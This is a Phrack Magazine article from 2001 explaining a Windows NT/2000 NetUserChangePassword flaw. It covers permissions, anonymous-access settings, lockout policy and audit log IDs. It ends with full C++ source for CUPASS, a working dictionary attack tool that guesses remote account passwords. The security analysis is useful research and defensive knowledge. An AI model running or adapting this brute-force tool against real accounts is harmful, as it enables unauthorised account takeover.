@@ -1,0 +1,902 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: Cupass and the netuserchangepassword problem ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a class="current" href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack57.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack57.tar.gz" title="Get current issue tar.gz">57</a> | <strong>Release date</strong> : <b>2001-08-11</b> | <strong>Editor</strong> : <b>Phrack Staff</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/57/1.html#article">Introduction</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/57/2.html#article">Phrack Loopback</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/57/3.html#article">Phrack Line Noise</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/57/4.html#article">Editorial policy</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/57/5.html#article">IA64 shellcode</a></td><td align="right">papasutra</td></tr>
+<tr><td align="left"><a href="../../issues/57/6.html#article">Taranis read your e-mail</a></td><td align="right">jwilkins</td></tr>
+<tr><td align="left"><a href="../../issues/57/7.html#article">ICMP based OS fingerprinting</a></td><td align="right">Ofir Arkin &amp; Fyodor Yarochkin</td></tr>
+<tr><td align="left"><a href="../../issues/57/8.html#article">Vudo malloc tricks</a></td><td align="right">MaXX</td></tr>
+<tr><td align="left"><a href="../../issues/57/9.html#article">Once upon a free()</a></td><td align="right">anonymous author</td></tr>
+<tr><td align="left"><a href="../../issues/57/10.html#article">Against the System: Rise of the Robots</a></td><td align="right">Michal Zalewski</td></tr>
+<tr><td align="left"><a href="../../issues/57/11.html#article">Holistic approaches to attack detection</a></td><td align="right">sasha</td></tr>
+<tr><td align="left"><a href="../../issues/57/12.html#article">NIDS on mass parallel processing architecture</a></td><td align="right">storm</td></tr>
+<tr><td align="left"><a href="../../issues/57/13.html#article">Hang on, snoopy</a></td><td align="right">stealth</td></tr>
+<tr><td align="left"><a href="../../issues/57/14.html#article">Architecture spanning shellcode</a></td><td align="right">eugene</td></tr>
+<tr><td align="left"><a href="../../issues/57/15.html#article">Writing ia32 alphanumeric shellcodes</a></td><td align="right">rix</td></tr>
+<tr><td align="left"><a href="../../issues/57/16.html#article">Cupass and the netuserchangepassword problem</a></td><td align="right">D.Holiday</td></tr>
+<tr><td align="left"><a href="../../issues/57/17.html#article">Phrack World News</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/57/18.html#article">Phrack magazine extraction utility</a></td><td align="right">Phrack Staff</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : Cupass and the netuserchangepassword problem</div>
+<div class="opt-bottom"> <strong>Author</strong> : D.Holiday</div>
+<pre>                             ==Phrack Inc.==
+
+               Volume 0x0b, Issue 0x39, Phile #0x10 of 0x12
+
+|=---------=[ CUPASS AND THE NETUSERCHANGEPASSWORD PROBLEM ]=------------=|
+|=-----------------------------------------------------------------------=|
+|=-------=[ Doc Holiday / THC &lt;holiday@TheHackersChoice.com&gt; ]=----------=|
+
+
+
+----|  INTRODUCTION
+
+
+
+Microsoft has a known problem in Windows NT 4, that enables an attacker
+to change the password of any user under special/default circumstances.
+
+
+The same problem reappeared in Windows 2000 some days ago. The flaw exists
+in Microsofts implementation of the NetUserChangePassword function.
+
+
+These facts inspired me to write this article and CUPASS, a simple tool 
+that starts a dictionary attack against user accounts. 
+
+
+In this article I want to discuss all things worth knowing about the 
+NetUserChangePassword problem.
+
+
+Have fun while reading this article...
+
+
+Doc Holiday /THC
+
+
+
+
+----| THE PASSWORD CHANGE PROTOCOLS
+
+
+As a little background I will tell you something about the possibilites
+to change a password in a Windows NT/W2K environment.
+
+
+Windows 2000 supports several protocols for changing passwords which
+are used under different circumstances. 
+
+
+These protocols are 
+
+
+- NetUserChangePassword protocol (we will call it NUCP)
+- NetUserSetInfo protocol
+- Kerberos change-password protocol
+- Kerberos set-password protocol
+- LDAP write-password attribute (presumes 128Bit SSL)
+- XACT-SMB protocol (for LAN Manager compatibility)
+
+
+Because there is a flaw in Microsofts implementation of the NUCP protocol,
+we will have a deeper look at this one.
+
+
+
+----| PROTOCOL ELECTION
+
+
+We can see that there are a lot of protocols for changing passwords in an 
+Microsoft environment. Now I will show in which cases the NUCP is used:
+
+
+case 1
+------
+
+
+If a user changes his password by pressing CTRL+ALT+DELETE and pressing the 
+&quot;Change Password&quot; button, the NUCP protocol is used, if the target is a
+domain or the local member server or workstation.
+
+
+If the target is a Kerberos realm, the Kerberos change-password protocol is 
+used instead of NUCP.
+
+
+case 2
+------
+
+
+If a change password request is initiated from an Windows NT 3.x or NT 4
+machine, the NUCP and/or NetUserSetInfo protocols are used.
+
+
+case 3
+------
+
+
+If a program uses the NUCP method on the Active Directory Services
+Interface (ADSI), the IaDSUser interface first tries to change the
+password with the LDAP protocol, and then by using the NUCP method.
+
+
+
+
+----| NUCP FUNCTION CALL
+
+
+At this time we know that a lot of ways exist to change a users 
+password. We also know in which cases NUCP is used.
+
+
+Now we want to have a little look at the function NetUserChangePassword
+itself. (More detailed information can be found at Microsoft's SDK!)
+
+
+
+Prototype
+---------
+
+
+The prototype of the NetUserChangePassword function is defined in
+&quot;lmaccess.h&quot;, and looks as follows:
+
+
+
+NET_API_STATUS NET_API_FUNCTION
+NetUserChangePassword (
+    IN  LPCWSTR   domainname OPTIONAL,
+    IN  LPCWSTR   username OPTIONAL,
+    IN  LPCWSTR   oldpassword,
+    IN  LPCWSTR   newpassword
+    );
+
+
+
+The parameters are explained consecutively:
+
+
+
+Parameters
+----------
+
+
+-&gt;domainname
+  ----------
+
+
+  Pointer to a null-terminated Unicode string that specifies the name of a 
+  remote server or domain. 
+
+
+-&gt;username
+  --------
+
+
+  Pointer to a null-terminated Unicode string that specifies a user name. 
+
+
+-&gt;oldpassword
+  -----------
+
+
+  Pointer to a null-terminated Unicode string that specifies the user's
+  old password on the server or domain. 
+
+
+-&gt;newpassword
+  -----------
+
+
+  Pointer to a null-terminated Unicode string that specifies the user's new
+  password on the server or domain.  
+
+
+
+Return values
+-------------
+
+
+The return values are defined in &quot;LMERR.H&quot; and &quot;WINERROR.H&quot;.
+
+
+With a deeper look in this files we can see that if the function was executed
+with success, the return value is 0 (zero) btw. NERR_Success.
+
+
+
+The most important error values are:
+
+
+-&gt;ERROR_ACCESS_DENIED (WINERROR.H)
+  --------------------------------
+
+
+  Access is denied ;)
+
+
+  If the target is a NT Server/Domain Controller, and the
+  option &quot;User Must Log On in Order to Change Password&quot; is enabled,
+  this error code is the result of CUPASS. The password could
+  not be guessed :(
+
+
+  If the target is a W2K domain controller with AD installed,
+  and the EVERYONE group is removed from the group
+  &quot;Pre-Windows 2000 compatible access&quot;, than this error code
+  is an result of NUCP.
+
+
+  In some cases this means the right password was guessed by
+  CUPASS, but could not be changed because of insufficient
+  permissions on the corresponding AD object.
+
+
+
+-&gt;ERROR_INVALID_PASSWORD (WINERROR.H)
+  -----------------------------------
+
+
+  The guessed password (oldpassword) was invalid
+
+
+
+-&gt;ERROR_ACCOUNT_LOCKED_OUT (WINERROR.H)
+  -------------------------------------
+
+
+  The account is locked due to many logon tries.
+
+
+
+-&gt;ERROR_CANT_ACCESS_DOMAIN_INFO (WINERROR.H)
+  ------------------------------------------
+
+
+  Indicates a Windows NT Server could not be contacted or that
+  objects within the domain are protected such that necessary
+  information could not be retrieved.
+
+
+
+-&gt;NERR_UserNotFound (LMERR.H)
+  ---------------------------
+
+
+  The useraccount could not be found on the given server.
+
+
+
+-&gt;NERR_NotPrimary (LMERR.H)
+  -------------------------
+
+
+  The operation is only allowed on the PDC. This appears e.g. if 
+  you try to change passwords on a BDC.
+
+
+
+This return values are evaluated by CUPASS. For all others, the numeric
+value will be shown, and you can simply have a look at this files for 
+the meaning of the errorcode.
+
+
+
+
+MORE DETAILS ON NUCP API CALL
+-----------------------------
+
+
+The NUCP function is only available on Windows NT and Windows 2000
+platforms.
+
+
+As part of the LanMan-API the NUCP function is UNICODE only!!! 
+This makes the programming a little bit harder, but not impossible :)
+
+
+UNICODE on Windows is an topic for itself, and we dont want to talk more
+about it here. Have a look at Microsofts msdn webpage or Charles
+Petzolds book about Windows programming, if you are interested in this
+topic.
+
+
+For a successfull usage of NUCP, you have to link your program with the 
+&quot;Netapi32.lib&quot; library!
+
+
+
+
+----| REQUIRED PERMISSIONS FOR NUCP 
+
+
+NUCP is part of the Microsoft network management functions.
+The management functions consists of different groups like
+NetFileFunctions, ScheduleFunctions, ServerFunctions, UserFunctions etc.
+
+
+These functions are again splitted in Query Functions and Update Functions. 
+Whilst query functions just allow to query informations, the update
+functions allow changes on objects.
+
+
+An example for a query function is e.g the NetUserEnum function which
+provides information about all user accounts on a server. 
+
+
+An example for an update function is the NetUserChangePassword function
+which changes the password of a user account :)
+
+
+Its easy to imagine, that query functions need less permissions than update
+functions for beeing executed.
+
+
+
+Lets have a look what permissions are needet:
+
+
+
+WINDOWS NT
+----------
+
+
+The query functions like NetGroupEnum, NetUserEnum etc. and can be
+executed by all authenticated users.
+
+
+This includes Anonymous users, if the RestrictAnonymous policy setting
+allows anonymous access.
+
+
+On a Windows NT member server, workstation or PDC, the
+NetUserChangePassword function can only be (successfull) executed by
+Administrators, Account Operators or the user of the account, if the option
+'User Must Log On in Order to Change Password' for this user is enabled.
+
+
+If 'User Must Log On in Order to Change Password'  is not enabled, a user can
+change the password of any other user, as long he knows the actual password.
+
+
+
+WINDOWS 2000
+------------
+
+
+The query functions like NetGroupEnum, NetUserEnum etc. can be executed by
+all authenticated users. This includes Anonymous users, if the
+RestrictAnonymous policy setting allows anonymous access.
+
+
+On a W2K member server or workstation the NetUserChangePassword function
+should only be (successfully) executable by Administrators, Account
+Operators or the user of the account.
+
+
+That this isn't the case, can be shown with CUPASS, because here is the
+flaw that Microsoft made with his implementation of NetUserChangePassword.
+
+
+On W2K member servers and workstations, the NetUserChangePassword function
+can be successfully executed by any user who knows the current password of
+the attacked user account.
+
+
+
+( For your information:
+
+
+The option 'User Must Log On in Order to Change Password' has been removed
+&gt;from W2K! )
+
+
+
+On a W2K domain controller with Active Directory, access to an object is
+granted based on the ACL of the object (Because W2K with installed AD
+stores the user passwords in the AD in contrast to NT 3.x/4).
+
+
+Network management query functions are permitted to all authenticated
+users and the members of the group &quot;Pre-Windows 2000 compatible access&quot;
+by the default ACL's.
+
+
+Theoretical Network Management Update functions like NUCP are only
+permitted to Administrators and Account Operators.
+
+
+That this is not the case, can also be shown with CUPASS.
+
+
+CUPASS works fine if AD is installed on the target system.
+
+
+If the &quot;everyone&quot; group is removed from the
+&quot;Pre-Windows 2000 compatible access&quot; group, the result of CUPASS will
+be Errorcode 5, which means ACCESS_DENIED!.
+
+
+My research shows that anyhow the password is guessed by CUPASS, but
+can not be changed because of insufficient permissions on the AD object!
+
+
+
+----| ANONYMOUS CONNECT
+
+
+There is something I didn't talk about much, the Anonymous User Problem,
+also known as the NULL-User problem.
+
+
+Lets have a short look at how the Anonymous security settings will take affect
+to the NUCP problem:
+
+
+-&gt; W2K
+   ---
+
+
+   The value Data of the following registry value regulates the behaviour
+   of the operating system regarding to the NULL USER CONNECT.
+
+
+   HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA 
+   Value: RestrictAnonymous
+   Value Type: REG_DWORD
+
+
+   If RestrictAnonymous is set to 0 (zero), which is the default setting,
+   CUPASS will work properly.
+
+
+   If RestrictAnonymous is set to 1, what means the enumeration of SAM
+   accounts and names is not allowed, CUPASS will work properly.
+  
+   If RestrictAnonymous is set to 2, what means no access without explicit
+   anonymous permissions, there is no possibility to change the password
+   with NUCP :(
+   
+   Because the value 2 has comprehensive consequences to the behaviour of
+   the windows environment (e.g. Browser service will not work properly,
+   netlogon secure channels could not be established properly by member
+   workstations etc..) it is rare used. 
+
+
+   These settings are the same on W2K member server and W2K DC with AD!
+
+
+
+-&gt; NT4
+   ---
+ 
+   The value Data of the following registry value regulates the behaviour
+   of the operating system regarding to the NULL USER CONNECT.
+
+
+   HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA 
+   Value: RestrictAnonymous
+   Value Type: REG_DWORD
+
+
+   Converse to W2K there are only two valid values 0 (zero) and 1 for
+   RestrictAnonymous.
+
+
+   If RestrictAnonymous is set to 0 (zero), which is the default setting,
+   CUPASS will work properly.
+
+
+   If RestrictAnonymous is set to 1, what means the enumeration of SAM
+   accounts and names is not allowed, CUPASS will work properly.
+
+
+
+
+
+
+COMMON
+------
+
+
+The process that calls the NetUserChangePassword function in some cases
+must have the SE_CHANGE_NOTIFY_NAME privilege
+(except for system account and members of the local Administrator group).
+Per default this privilege is enabled for every account, but can be
+disabled by the administrator.
+
+
+SE_CHANGE_NOTIFY_NAME could not be found at the privileges,
+because it is called &quot;Bypass traverse checking&quot;!
+
+
+This is an declarative from Microsoft. I tried it, but I didn't find a case
+in that this right was necessary to execute the NUCP function call.
+
+
+
+
+----| POLICY AND LOGGING
+
+
+I will have a look for the policy settings, that will take affect to the
+NUCP problem.
+
+
+
+ACCOUNT POLICIES
+----------------
+
+
+-&gt;PASSWORD POLICY
+  ---------------
+  
+  The settings &quot;Enforce password history&quot; and  &quot;Minimum password age&quot;
+  will take effect to the result of CUPASS, in the way that CUPASS can't
+  &quot;realy&quot; change the password, and the error code 2245 will result. 
+ 
+  But this doesn't matter, because we know the &quot;old&quot; password at this time,
+  and CUPASS just tried to replace the &quot;old&quot; password with the &quot;old&quot;
+  password again.
+    
+
+
+-&gt;ACCOUNT LOGOUT POLICY
+  ---------------------
+ 
+  Account lockout treshold
+  ------------------------
+
+
+  The settings &quot;Account lockout duration&quot; and
+  &quot;Reset Account lockout after ...&quot; are only relevant if the
+  &quot;Account lockout treshold&quot; ist set to any value &gt;0.
+
+
+  If the treshold is set, than this takes affect to the work of CUPASS,
+  because all attempts of CUPASS exceeding the treshold will lead to an
+  account lockout :(
+
+
+  However the Logout Policy ist not valid for the Administrator on NT4
+  environments, until the NT Reskit tool &quot;Passprop&quot; is used!
+  In this case even the Administator account will be locked
+  for network logons!
+
+
+  If we start CUPASS against any account of a W2K server or a W2K domain
+  controller with AD, this account is locked out, and even the
+  Administrator account is marked as &quot;Account is locked out&quot;, too !
+
+
+  But it is still possible for the Administrator account to log on
+  interactive on the machine!
+
+
+  
+  
+
+
+
+AUDIT POLICY
+------------
+
+
+  Lets have a look which auditing events have to enabled, to see an
+  CUPASS attack in the security logs of the target machine.
+
+
+  
+  Audit Account Management
+  ------------------------
+
+
+  If the setting &quot;Audit Account Management&quot; is enabled (success/failure),
+  an entry with the ID 627 appears in in the security log.
+
+
+  This entry contains all necessary datas for the administrator :(
+  These e.g. are: Date, Time, Target Account Name, Caller User Name etc.
+
+
+  
+  Audit account logon events
+  --------------------------
+
+
+  Surprisingly for some administrators, there appears no log entry if
+  the settings &quot;Audit account logon events&quot; or &quot;Audit logon events&quot;
+  are enabled, if the attack goes to the local machine.
+
+
+  This is e.g. the case if you want to guess the local administrator
+  password of your machine.
+
+
+  If the CUPASS attack comes from remote, log entries ID 681 and ID 529
+  occures.
+
+
+
+  Audit Object Access
+  -------------------
+  
+  If this type of auditing is enabled, and the attack goes to the
+  local machine, an logfile entry with the ID 560 and 562 appears.
+
+
+  ID 560 tells us that someone opened the object
+  &quot;Security Account Manager&quot; whilst 562 tells us something like
+  &quot;Handle closed&quot;...
+
+
+
+Maybe there occure some more logfile entries with other ID's, but these
+ones listed above are the ones I found while testing CUPASS.
+
+
+So test CUPASS on your own environment and have a look into your logfiles!
+
+
+
+
+----| LAST WORDS
+
+
+I hope this article could give you a little overview about the
+NetUserChangePassword problem, and Microsoft's inconsequent implementation
+of security and function calls.
+
+
+This article could not treat this topic concluding, because there are
+so many different situations and configurations that I could not test
+in my short sparetime :)
+
+
+
+----| GREETS
+
+
+Greets to Van Hauser who inspired me for this release, ganymed, mindmaniac
+and all the other members from THC, VAX who gives me a lift to HAL2001,
+the guys from TESO, Seth, Rookie and all the other people knowing me...
+
+
+The biggest THANX are going to my wife, who missed me nearly the whole
+weekend while I was writing this article!
+ 
+Ok, have a nice day and lets meet and party at HAL2001 :)
+
+
+
+&lt;++&gt; cupass.cpp !a10c7302
+/*
+ * CUPASS v1.0 (c) 2001 by Doc Holiday / THC &lt;Holiday@TheHackersChoice.com&gt;
+ * http://www.hackerschoice.com
+ *
+ * Dictionary Attack against Windows Passwords with NetUserChangePassword.
+ * Do only use for legal purposes.
+ * 
+ * Compiled and tested on Windows NT/W2K - runs not on Win9x!!
+ * Compiled with VC++ 6.0
+ *
+ */
+
+
+#define UNICODE 1
+#define _UNICODE 1
+
+
+#include &lt;windows.h&gt;
+#include &lt;lmaccess.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;wchar.h&gt;
+
+
+#pragma comment( lib, &quot;netapi32.lib&quot; )
+
+
+
+void wmain( int argc, wchar_t *argv[] )
+{
+        wchar_t *hostname = 0; 
+        wchar_t *username = 0; 
+        wchar_t *dictfile = 0; 
+        wchar_t myChar[256];
+        NET_API_STATUS result;
+        FILE *stream;
+        LPWSTR oldpassword; 
+
+
+        if (argc != 4)
+        { 
+        wprintf (L&quot;\nMissing or wrong parameters!\n&quot;); 
+            wprintf (
+               L&quot;\nUsage: cupass \\\\hostname username dictionaryfile\n&quot;);
+            exit(1);
+        }
+
+
+        hostname = argv[1];
+        username = argv[2];
+        dictfile = argv[3];
+
+
+    if (wcsncmp(hostname, L&quot;\\\\&quot;,2 )!=0)
+        {
+            wprintf (L&quot;\nups... you forgot the double backslash?&quot;);
+            wprintf (
+                L&quot;\nUsage: cupass \\\\hostname username dictionaryfile\n&quot;);
+            exit(1);
+        }
+
+
+  if( (stream  = _wfopen( dictfile, L&quot;r&quot; )) == NULL )
+        {
+      wprintf( L&quot;\nups... dictionary %s could not be opened&quot;, dictfile );
+      wprintf (L&quot;\nUsage: cupass \\\\hostname username dictionaryfile\n&quot;);
+        }
+   else
+   {
+        
+        wprintf (L&quot;\n*** CUPASS 1.0 - Change User PASSword - by Doc Holiday/THC (c) 2001 ***\n&quot;);
+        wprintf (L&quot;\nStarting attack .....\n&quot;);
+        wprintf (L&quot;\nTarget: %s &quot;, hostname);
+        wprintf (L&quot;\nUser: %s\n &quot;, username);
+
+
+        while( !feof( stream ) )
+        {
+          fgetws (myChar, 256,stream);
+
+
+          if (myChar[wcslen(myChar)-1] == '\r') myChar[wcslen(myChar)-1] = '\0';
+          if (myChar[wcslen(myChar)-1] == '\n') myChar[wcslen(myChar)-1] = '\0';
+
+
+          oldpassword = myChar;
+   
+          wprintf( L&quot;\nTrying password %s \n&quot;, oldpassword );
+                
+          result = NetUserChangePassword( hostname, username,oldpassword, oldpassword );
+                
+          switch (result)
+          {
+                case 0: 
+                        wprintf( L&quot;GOTCHA!! Password was changed\n&quot; );
+                        wprintf( L&quot;\nPassword from user '%s' is '%s'\n&quot;, username, oldpassword);
+                        fclose (stream);
+                        exit (1);
+                        break;
+                        
+                case 5: //ERROR_ACCESS_DENIED
+                        wprintf (L&quot;Attempt failed -&gt; ERROR_ACCESS_DENIED - \
+But password could be %s\n&quot;, oldpassword);
+                        fclose (stream);
+                        exit(1);
+                        break;
+                        
+                case 86: //ERROR_INVALID_PASSWORD
+                        wprintf( L&quot;Attempt failed -&gt; Incorrect password\n&quot; );
+                        break;
+                        
+                case 1351: //ERROR_CANT_ACCESS_DOMAIN_INFO 
+                        wprintf (L&quot;Attempt failed -&gt; Can't establish connection to Host %s\n&quot;,hostname);
+                        fclose (stream);
+                        exit(1);
+                        break;
+
+
+                case 1909: //ERROR_ACCOUNT_LOCKED_OUT
+                        wprintf (L&quot;Attempt failed -&gt; Account locked out\n&quot;);
+                        fclose (stream);
+                        exit(1);
+                        break;
+
+
+                case 2221: //NERR_UserNotFound) 
+                        wprintf (L&quot;Attempt failed -&gt; User %s not found\n&quot;, username);
+                        fclose (stream);
+                        exit(1);                   
+                        break;
+                        
+                case 2226://NERR_NotPrimary
+                        wprintf (L&quot;Attempt failed -&gt; Operation only allowed on PDC\n&quot;);
+                        break;
+
+
+                case 2245:
+                        wprintf (L&quot;GOTCHA!! Password is '%s' , but \
+couldn't be changed to '%s' due to password policy settings!\n&quot;, \
+oldpassword, oldpassword);
+                        fclose(stream);
+                        exit(1);
+                        break;
+
+
+                default:
+                        wprintf( L&quot;\nAttempt failed :( %lu\n&quot;, result );
+                        fclose(stream);
+                        exit(1);
+                        break;
+                }
+        }
+        fclose (stream); 
+   }    
+}
+&lt;--&gt; end cupass.cpp
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
